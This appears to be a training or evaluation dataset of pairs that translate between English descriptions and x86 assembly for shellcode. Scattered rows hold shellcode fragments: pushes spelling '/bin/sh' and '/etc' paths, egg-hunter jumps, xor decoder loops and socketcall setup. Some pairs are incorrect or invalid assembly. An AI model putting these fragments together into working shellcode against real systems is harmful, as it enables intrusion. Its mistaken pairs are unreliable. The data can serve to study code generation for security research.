input_text,target_text
"ShellCodeSum: shl eax, 1",multiply the value of eax by 2
ShellCodeGen: move the byte in esi into al,"mov al, byte [esi]"
ShellCodeSum: push dword 0x72657355,push the dword 0x72657355 onto the stack
ShellCodeGen: push the zero_reg onto the stack,push zero_reg
ShellCodeGen: declare the loop label,loop:
ShellCodeGen: jump to the fillOnes label if the contents of the al register is equal to 0xf2 else move the value 0x59935193 into the eax register,"cmp al, 0xf2 \n je fillOnes \n mov eax, 0x59935193"
"ShellCodeSum: mov dl, len",move the contents stored at the address len into the dl register
ShellCodeSum: push ebp,push the contents of the ebp register onto the stack
ShellCodeSum: push dword 0x303a3a31,push the double word 0x303a3a31 onto the stack
ShellCodeSum: call_shellcode:,define the call_shellcode label
ShellCodeGen: jump to the _start label,jmp _start
ShellCodeGen: declare buffersize to be a word containing 1024,buffersize: dw 1024
ShellCodeGen: compare the byte in esi with 0x7,"cmp byte [esi], 0x7"
ShellCodeGen: call the writestring function,call writestring
"ShellCodeSum: mov dword [esp-0xc], 0x735f6176",move the value 0x735f6176 into the double word starting at the address [esp-0xc]
ShellCodeGen: push the value 0x2f2f2f2f onto the stack and point esi to the stack register,"push 0x2f2f2f2f \n mov esi, esp"
ShellCodeSum: pop eax,remove last character from the stack into eax
ShellCodeSum: jmp shell,jump to the shell label
ShellCodeGen: move the effective address of byte_tbl+2 to al register,"mov al, [byte_tbl+2]"
ShellCodeSum: call me,call the me function
ShellCodeGen: if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address then jump to the _next label else jump to the eax register,"cmp dword [eax-4], egg2 \n je _next \n jmp eax"
"ShellCodeSum: mov byte al, 83",move 83 into the byte at address al
ShellCodeGen: push $0x632d onto the stack,pushw $0x632d
ShellCodeGen: move memory word_value to register bx,"mov bx, word_value"
"ShellCodeSum: mov [1000h], ax",move the value of ax into memory at address 1000h
"ShellCodeSum: xor ecx, ecx \n push ecx",push zero onto the stack
ShellCodeGen: call the _write function,call _write
ShellCodeGen: subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not zero,"sub al, 1 \n jnz l1"
ShellCodeGen: if the contents of the dl register is greater than the decimal value 27 then jump to the label l3,"cmp dl, 27 \n jg l3"
ShellCodeGen: push the byte +0x66 onto the stack,push byte +0x66
ShellCodeGen: perform a logical xor between the dl register and 0xbb and save the result in dl,"xor dl, 0xbb"
ShellCodeGen: restore the top of the stack into the ecx register then decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else make the system call exit,"pop ecx \n loop l2 \n mov eax, 1"
ShellCodeGen: move the contents at memory address x to ebx,"mov ebx, [x]"
ShellCodeGen: move number 9 into ebx,"mov ebx, 9"
ShellCodeGen: jump to the shift_decode label if the result of the logical xor between the cl register and the value 0xAA is zero,"xor cl, 0XAA \n jz shift_decode"
ShellCodeSum: push word 0x2923,push 0x2923 onto stack port
ShellCodeGen: push the byte 0x17 onto the stack,push byte 0x17
ShellCodeGen: push the value 0x69622f2f onto the stack and point the edx register to the stack register,"push 0x69622f2f \n mov edx, esp"
"ShellCodeSum: mov ecx, esp",move address of stack pointer into ecx
"ShellCodeSum: mov cl, 30",move 30 to the cl register
ShellCodeGen: define the byte string '/bin/sh#sh#',db '/bin/sh#sh#'
ShellCodeGen: move eax to ebp,"mov ebp, eax"
ShellCodeGen: jump short to the _execline label,jmp short _execline
ShellCodeSum: push 0x3170762d,push 0x3170762d onto the stack
ShellCodeGen: push 20 onto the stack,push 20
"ShellCodeSum: mov eax, 3",make the system call to read the file
ShellCodeSum: main_inc:,create label main_inc
ShellCodeGen: if zero flag is set jump to nomoreargs label,jz nomoreargs
ShellCodeGen: right rotate esi 1 time,"ror esi, 1"
ShellCodeGen: restore the top of the stack into eax register,pop eax
ShellCodeGen: move dl into al,"mov al, dl"
"ShellCodeSum: mov ebx, edi",move edi into ebx
ShellCodeGen: define formatting label,formatting:
ShellCodeSum: dec ecx,decrement the contents of the ecx register
ShellCodeGen: move the byte at the address 66h into al,"mov al, byte 66h"
"ShellCodeSum: mov ax, 0x16c",move 0x16c into ax
ShellCodeSum: push 0x6d726574,push 0x6d726574 onto the stack
"ShellCodeSum: xor cl, 0xAA \n jnz Next_Cycle",jump to the Next_Cycle label if the result of the logical xor between the cl register and the value 0xAA is not zero
"ShellCodeSum: mov long [esi+26], eax",move the contents of the eax register into the long starting at the address [esi+26]
ShellCodeGen: do no operation,nop
ShellCodeGen: move the address of msg string into eax,"mov eax, msg"
ShellCodeGen: if the contents of the eax register is zero then jump to the label proc_name,"test eax, eax \n jz proc_name"
ShellCodeGen: subtract 20h from the 8-bit at memory location buff,"sub byte [buff],20h"
ShellCodeGen: declare 6 bytes starting at the address str initialized to the ascii character values for hello and the null byte,"str db 'hello',0"
ShellCodeSum: set_argv:,define set_argv label
ShellCodeGen: move the 3rd element of the array byte_table into cl,"mov cl, byte_table[2]"
ShellCodeGen: multiply the contents of eax by 3,mul 3
ShellCodeSum: jmp connec,jump to connec
ShellCodeGen: add 0x2 to the contents of ebp,"add ebp, 0x2"
ShellCodeGen: define close_syscall equal to 6,close_syscall equ 6
ShellCodeGen: decrement ebp,dec ebp
ShellCodeGen: declare msglength to have the constant value 12,msglength: equ 12
ShellCodeGen: push the dword 0x6374652f onto the stack,push dword 0x6374652f
ShellCodeSum: push byte 9,push the byte 9 onto the stack
ShellCodeGen: define a byte string and initialize it to '/bin/sh',db '/bin/sh'
ShellCodeSum: cycle:,declare the cycle label
ShellCodeGen: jump to the search_the_egg label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register,"cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax"
ShellCodeSum: jnz 1,if not zero jump to numeric label 1
"ShellCodeSum: mov eax, 3",move 3 to the eax register
"ShellCodeSum: mov [esi+34], al",move al into the address [esi+34]
ShellCodeGen: pop the top of the stack into the edx register,pop edx
ShellCodeGen: swap the values of ebx and esp registers,"xchg ebx, esp"
ShellCodeGen: subtract 20000h from eax register,"sub eax,20000h"
ShellCodeGen: push 0x2f6e6962 to the stack,push 0x2f6e6962
ShellCodeGen: declare the setup label,setup:
ShellCodeSum: push byte 0x3,push the byte 0x3 onto the stack
ShellCodeSum: push byte 70,push the byte 70 onto the stack
ShellCodeSum: push 0x746f6f72,push 0x746f6f72 onto the stack
ShellCodeSum: push byte chmod_call,push the byte chmod_call onto the stack
"ShellCodeSum: push word 0x632d \n mov esi, esp",push the word 0x632d onto the stack and point the esi register to the stack register
ShellCodeGen: if zero jump to the child label,jz child
ShellCodeGen: push 0x30313a31 to the stack,push 0x30313a31
ShellCodeGen: create a string 'hello world!' plus a linefeed character,"hello: db 'hello world!',10"
ShellCodeGen: place address buff into esi,"mov esi, buff"
ShellCodeSum: div dword [value],divide the contents of eax by the word value stored at memory location value
"ShellCodeSum: mov eax, ecx",move the value of ecx into eax
"ShellCodeSum: mov byte [esi], dl",move dl into the byte in esi
ShellCodeSum: push byte 0x1c,push the byte 0x1c onto the stack
ShellCodeGen: read the file,"mov eax, 3"
ShellCodeGen: clear the ecx register,"xor ecx, ecx"
ShellCodeSum: inc ebx,increment ebx
ShellCodeSum: call _printf,call the _printf function
ShellCodeGen: load the effective address [zero_reg+3] into eax,"lea eax, [zero_reg+3]"
"ShellCodeSum: xchg [ebp+16], ecx",swap the address [ebp+16] with the contents of the ecx register
ShellCodeGen: push the value 0x6e7a762d onto the stack and point the ebp register to the stack register,"push 0x6e7a762d \n mov ebp, esp"
ShellCodeGen: invoke sys_socketcall,"mov eax, 102"
"ShellCodeSum: mov bl, byte [edi]",move the byte at the address [edi] into bl
"ShellCodeSum: mov cl, 0x3",move 0x3 into cl
"ShellCodeSum: add eax, ebx",add ebx to eax
ShellCodeGen: push 0x45683933 onto the stack,push 0x45683933
"ShellCodeSum: mov al, byte 3fh",move the byte at the address 3fh into al
ShellCodeGen: move the value of ecx into eax,"mov eax, ecx"
"ShellCodeSum: cmp edx, 10",compare whether the edx register has reached 10
ShellCodeGen: push the value 0x6e69622f and the value 0x7273752f onto the stack and point the ebx register to the stack register,"push 0x6e69622f \n push 0x7273752f \n mov ebx, esp"
ShellCodeSum: je short encodedshellcode,jump short to encodedshellcode if equal
ShellCodeGen: add the contents of the bh register into the ah register,"add ah, bh"
"ShellCodeSum: mov eax, addr",move addr into eax
"ShellCodeSum: shr edx, byte 16",right shift the contents of the edx register by the byte 16
ShellCodeGen: move mxcsr to eax,"mov eax, mxcsr"
ShellCodeGen: push esp onto the stack,push esp
ShellCodeGen: push 0x742f3a31 onto the stack,push 0x742f3a31
"ShellCodeSum: test al, al \n jz found \n inc ecx",jump to the label found if the contents of the al register is zero else increment the contents of the ecx register
ShellCodeSum: not esi,negate all the bits of the esi register
ShellCodeGen: compare the contents of eax and the contents of eax,"cmp eax, eax"
ShellCodeSum: var db 64,declare a byte containing the value 64 at label the memory location var
"ShellCodeSum: mov byte [esp], 0x2e",move 0x2e into the byte in esp
ShellCodeGen: put the offset of hello in ecx,"mov ecx, hello"
"ShellCodeSum: mov bl, 0x4",move 0x4 into bl
ShellCodeGen: jump to the exit_on_error label if the zero flag is cleared,jnz exit_on_error
ShellCodeGen: multiply ebx by 2 using left shift,"shl ebx, 1"
"ShellCodeSum: mov al, 23",move 23 into al
ShellCodeGen: push 0x203a4457 onto the stack,push 0x203a4457
ShellCodeGen: if the contents of the eax register is not zero then jump to the label _recv_http_request else subtract the value 0x6 from the contents of the ecx register,"test eax, eax \n jnz _recv_http_request \n sub ecx, 0x6"
ShellCodeSum: push ecx,push the contents of the ecx register onto the stack
ShellCodeSum: popad,move doublewords from the stack into the general purpose registers
ShellCodeGen: push the contents of eax onto the stack,push eax
"ShellCodeSum: sub bl, 3",subtract 3 from the contents of the bl register
"ShellCodeSum: push 0x6374652f \n mov eax, esp",push the value 0x6374652f onto the stack and point eax to the stack register
ShellCodeGen: subtract the contents of cx from the contents of cx,"sub cx, cx"
ShellCodeGen: push the value 0x7461632f and the value 0x6e69622f onto the stack and point the ebx register to the stack register,"push 0x7461632f \n push 0x6e69622f \n mov ebx, esp"
ShellCodeGen: move eax to x variable,"mov x, eax"
ShellCodeGen: push the 0x31373737 onto the stack,push 0x31373737
ShellCodeGen: move the byte 6h into al,"mov al, byte 6h"
"ShellCodeSum: mov eax, n_src",move n_src to eax
ShellCodeSum: dec ecx,decrement ecx
"ShellCodeSum: mov edx, esp",move address of stack pointer into edx
ShellCodeSum: pop [eax],pop the top element of the stack into memory at the four bytes starting at location eax
ShellCodeSum: jnc 0xd8,jump to 0xd8 it the carry flag is zero
ShellCodeGen: push the word 0x2e2e onto the stack,push word 0x2e2e
ShellCodeGen: swap the contents of the ebx register with the contents of the esp register,"xchg ebx, esp"
ShellCodeGen: copy my_var contents in ax,"mov ax, [my_var]"
ShellCodeGen: define main label,main:
ShellCodeGen: push the byte 0x64 to the stack,push byte 0x64
ShellCodeGen: push 0x69622f3a onto the stack,push 0x69622f3a
"ShellCodeSum: push 0x6475732f \n push 0x6374652f \n mov ebx, esp",push the value 0x6475732f and the value 0x6374652f onto the stack and point the ebx register to the stack register
ShellCodeGen: move a byte from the address esi+ecx into al,"mov al, byte [esi+ecx]"
ShellCodeGen: load the effective address of the result of the operation [ecx+0bh] into the eax register,"lea eax, [ecx+0bh]"
"ShellCodeSum: mov al, 0x21",move 0x21 into al
"ShellCodeSum: lea eax, [ebx+8]",put the address of ebx+8 into eax
ShellCodeSum: pushw $0x632d,push $0x632d onto the stack
ShellCodeGen: jump to two,jmp two
"ShellCodeSum: lea ebx, [esi+14]",load the effective address of the result of the operation [esi+14] into the ebx register
"ShellCodeSum: push 0x7461632f \n push 0x6e69622f \n mov edx, esp",push the value 0x7461632f and the value 0x6e69622f onto the stack and point the edx register to the stack register
"ShellCodeSum: xchg edx, eax",exchange edx with eax
ShellCodeGen: push the dword 0x7461632f onto the stack,push dword 0x7461632f
"ShellCodeSum: push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp",put /bin/sh into ecx
ShellCodeGen: syscall 102,"mov al, 0x66"
ShellCodeGen: divide the contents of eax by the word value stored at memory location value,div dword [value]
"ShellCodeSum: xor bx,bx",zero out bx register
ShellCodeGen: load the value of register ebx into register esp,"lea esp, [ebx]"
ShellCodeGen: move 0x735f6176 into esi,"mov esi, 0x735f6176"
ShellCodeSum: exit:,define the exit label
ShellCodeSum: push dword 0x6e69922f,push the dword 0x6e69922f onto the stack
ShellCodeGen: push double word 0x74652f2f onto the stack and point the edx register to the stack register,"push dword 0x74652f2f \n mov edx, esp"
ShellCodeSum: call _exit,call _exit
"ShellCodeSum: test al, al",test the value of the al register
ShellCodeGen: push 0x7369642d onto the stack,push 0x7369642d
ShellCodeGen: move al into the byte in esi,"mov byte [esi], al"
"ShellCodeSum: shr edx, 2",divide edx by 4 using right shift
ShellCodeSum: push 0x4f4e2029,push 0x4f4e2029 onto the stack
ShellCodeGen: swap the contents of eax and ebx,"xchg eax, ebx"
ShellCodeGen: push the value 0x7 onto the stack and point edx to the stack register,"push 0x7 \n mov edx, esp"
ShellCodeSum: je stop,jump to label stop if equal
"ShellCodeSum: push 0x6374652f \n mov edi, esp",push the value 0x6374652f onto the stack and point edi to the stack register
ShellCodeGen: call the code function,call code
ShellCodeGen: jump to the _while_loop label,jmp _while_loop
ShellCodeSum: push byte 0x01,push the byte 0x01 to the stack
ShellCodeGen: subtract 1662 from the contents of ax register and save the result in ax,"sub ax, 1662"
"ShellCodeSum: mov eax, 90",system call mmap
ShellCodeGen: move 72h into al,"mov al, 72h"
"ShellCodeSum: lea ebx, [esi]",load the effective address of esi into the ebx register
